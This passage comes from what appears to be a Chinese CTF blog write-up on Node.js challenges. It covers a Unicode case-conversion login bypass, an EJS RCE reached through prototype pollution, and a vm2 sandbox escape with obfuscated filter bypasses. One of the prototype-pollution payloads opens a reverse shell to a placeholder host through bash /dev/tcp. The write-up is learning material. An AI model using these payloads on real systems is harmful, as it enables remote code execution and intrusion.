res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) <br>   &#125;<br>    req.session.user=&#123;<br>      <span class="hljs-string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),<br>      <span class="hljs-string">&#x27;passwd&#x27;</span>: req.body.pwd,<br>      <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>    &#125;<br>    res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>); <br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.body.Submit==<span class="hljs-string">&quot;login&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!req.session.user)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;<br>    <span class="hljs-keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;<br>      req.session.user.isLogin=<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>      res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)<br>    &#125;<br>  <br>  &#125;<br>  res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>); ;<br>&#125;);<br></code></pre></td></tr></table></figure>
+<p>第四块是<code>/action</code>路由，该路由要求用户会话的用户名必须是<code>ADMIN</code>，符合要求则调用<code>clone</code>方法（自定义）处理我们POST上去的数据（可控）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">router.post(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.session.user.user!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.session.user.data = clone(req.body);<br>  res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  <br>&#125;);<br></code></pre></td></tr></table></figure>
+<p>第五块是<code>/info</code>路由，看到<code>res.outputFunctionName</code>这个直接输出，经过在网上查询一些文章，可以发现，这个是存在问题的—–&gt;<code>ejs的RCE</code></p>
+<p><a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">router.get(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);<br>&#125;)<br></code></pre></td></tr></table></figure>
+<p>第六块来看看<code>clone</code>和<code>merge</code>，这一块在涉及到原型链污染的问题</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184#toc-6">https://xz.aliyun.com/t/7184#toc-6</a> 这一篇文章有讲过</p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/8.png" srcset="/img/loading.gif"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span>;<br><span class="hljs-keyword">const</span> merge = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>    <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;<br>      merge(a[attr], b[attr]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      a[attr] = b[attr];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a<br>&#125;<br><span class="hljs-keyword">const</span> clone = <span class="hljs-function">(<span class="hljs-params">a</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> merge(&#123;&#125;, a);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>攻击思路：</p>
+<p>1.首先利用<code>javascript</code>的大小写的转换特性，<code>ı</code>经过<code>toUpperCase()</code>转换成<code>I</code>。构造<code>admın</code>，绕过<code>safeKeyword</code>方法对<code>ADMIN</code>的检查，获得管理员的用户会话。</p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/10.png" srcset="/img/loading.gif"></p>
+<p>2.接着用<code>merge</code>原型链污染的问题，来造成<code>EJS RCE</code>的漏洞触发。</p>
+<p>Payload:</p>
+<figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;test1;clearTimeout.constructor.constructor(&#x27;</span><span class="hljs-keyword">return</span> process&#x27;)().mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;cat /flag &gt; /app/public/reader&#x27;</span>).toString();var test2<span class="hljs-string">&quot;&#125;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">或者</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;&quot;</span>__proto__<span class="hljs-string">&quot;:&#123;&quot;</span>outputFunctionName<span class="hljs-string">&quot;:&quot;</span>_tmp1;global.process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;</span>);var __tmp2<span class="hljs-string">&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/11.png" srcset="/img/loading.gif"></p>
+<p>访问<code>/info</code>，完成污染。</p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/12.png" srcset="/img/loading.gif"></p>
+<p>再访问<code>/reader</code>得到<code>flag</code></p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/13.png" srcset="/img/loading.gif"></p>
+<h2 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184#toc-11">https://xz.aliyun.com/t/7184#toc-11</a></p>
+<p><a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/246029.html">https://www.freebuf.com/vuls/246029.html</a></p>
+<h1 id="3-HFCTF2020-JustEscape"><a href="#3-HFCTF2020-JustEscape" class="headerlink" title="3.[HFCTF2020]JustEscape"></a>3.[HFCTF2020]JustEscape</h1><p>知识点：</p>
+<ul>
+<li>vm.js 沙箱逃逸与过滤绕过</li>
+<li>JavaScript 模板字符串</li>
+</ul>
+<p>打开题目，以为是php代码执行的问题，结果试了半天，没有成功，连<code>phpinfo();</code>都没执行。</p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/14.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/15.png" srcset="/img/loading.gif"></p>
+<p>没办法看了赵总的wp:<a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6512.html">https://www.zhaoj.in/read-6512.html</a></p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/16.png" srcset="/img/loading.gif"></p>
+<p>赵总牛逼！！</p>
+<p>按我以前所学，我还不知道可以用每种语言产生异常的代码来fuzz的，果然还是太菜了。。。。</p>
+<p>输入<code>Error().stack</code>，有以下报错：</p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/17.png" srcset="/img/loading.gif"></p>
+<p>发现是<code>NodeJS+vm2</code></p>
+<p>​    VM2 是一个用来运行不受信任代码的沙箱虚拟机。可以去issue找一下逃逸相关的issue。维护者一直在不断找逃出沙盒的链条与方法，查找到许多可以逃出沙盒执行命令的方法。</p>
+<p>先找了一个<a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues/285">https://github.com/patriksimek/vm2/issues/285</a></p>
+<p>在本地执行是成功的。</p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/18.png" srcset="/img/loading.gif"></p>
+<p>打上去，似乎被过滤了。大概有 for, while, process, exec, eval, constructor, prototype, Function, 双引号, 单引号被过滤了。</p>
+<p>根据赵总的博客，发现如下方法可以绕过。</p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/19.png" srcset="/img/loading.gif"></p>
+<p>将以上找到的绕过沙箱的poc进行改写。</p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/20.png" srcset="/img/loading.gif"></p>
+<p>url编码后打上去。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">try</span> &#123;<br>    a = &#123;&#125;;<br>    a.toString = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br>    <span class="hljs-built_in">this</span>[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`proc`</span>&#125;</span>ess`</span>].listeners(a);<br>&#125; <span class="hljs-keyword">catch</span>(e) &#123;<br>    <span class="hljs-built_in">console</span>.log(<br>        e[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`construc`</span>&#125;</span>tor`</span>][<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`constru`</span>&#125;</span>ctor`</span>](<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`return this.proc`</span>&#125;</span><span class="hljs-subst">$&#123;<span class="hljs-string">`ess.mainModule.require(<span class="hljs-subst">$&#123;<span class="hljs-string">`\`child_pro`</span>&#125;</span><span class="hljs-subst">$&#123;<span class="hljs-string">`cess\``</span>&#125;</span>)<span class="hljs-subst">$&#123;<span class="hljs-string">`.exe`</span>&#125;</span><span class="hljs-subst">$&#123;<span class="hljs-string">`cSync(\`whoami\`)`</span>&#125;</span>`</span>&#125;</span>`</span>&#125;</span>`</span>)().toString()<br>    );<br>&#125;<br>&#125;)()<br><br></code></pre></td></tr></table></figure>
+<p>结果如下报错。。。。。。。不知道为什么。。。（有师傅知道可以教我下）</p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/21.png" srcset="/img/loading.gif"></p>
+<p>最后用了 <a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">TypeError</span>[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>] = <span class="hljs-function"><span class="hljs-params">f</span>=&gt;</span>f[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`return this.proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-built_in">Object</span>.preventExtensions(Buffer.from(<span class="hljs-string">``</span>)).a = <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">catch</span>(e)&#123;<br>        <span class="hljs-keyword">return</span> e[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>](<span class="hljs-function">()=&gt;</span>&#123;&#125;).mainModule[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="hljs-string">`whoami`</span>).toString();<br>    &#125;<br>&#125;)()<br></code></pre></td></tr></table></figure>
+<p>成功执行命令。</p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/22.png" srcset="/img/loading.gif"></p>
+<h2 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6512.html">https://www.zhaoj.in/read-6512.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Node-js/">Node.js</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SWPUCTF2020-WEB复现wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/12/02/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">
+                        <span class="hidden-mobile">Session反序列化学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
